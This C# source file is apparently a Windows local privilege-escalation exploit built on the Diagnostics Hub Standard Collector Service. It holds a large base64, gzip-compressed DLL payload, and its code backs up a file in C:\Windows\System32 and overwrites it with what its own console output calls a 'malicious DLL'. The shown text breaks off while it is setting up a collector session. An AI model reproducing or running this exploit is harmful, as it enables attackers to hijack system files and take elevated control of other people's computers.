using System;
using System.IO;
using System.Threading;
using System.Diagnostics;
using System.Globalization;
using System.IO.Compression;
using System.Collections.Generic;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace CollectorService
{
    public class DLL
    {

        private static IStandardCollectorService _service;

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int ManualRegisterInterfacesDelegate();

        public static void Load(string filename)
        {
            // add your shizz here
            var dll = DecompressDLL(Convert.FromBase64String("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"));

            var sessionId = Guid.NewGuid();
            var scratch = $@"C:\Users\{Environment.UserName}\AppData\Local\Temp";

            // backup
            Console.WriteLine($@" [>] Backing up {filename} to {scratch}");
            File.Copy($@"C:\Windows\System32\{filename}", $@"{scratch}\{filename}");

            // overwrite
            Console.WriteLine($@" [>] Overwriting C:\Windows\System32\{filename} with malicious DLL");
            File.WriteAllBytes($@"C:\Windows\System32\{filename}", dll);

            Thread.Sleep(1000);

            var procId = Process.GetCurrentProcess().Id;
            var sessionConfiguration = new SessionConfiguration
            {
                ClientLocale = (ushort)CultureInfo.InvariantCulture.LCID,
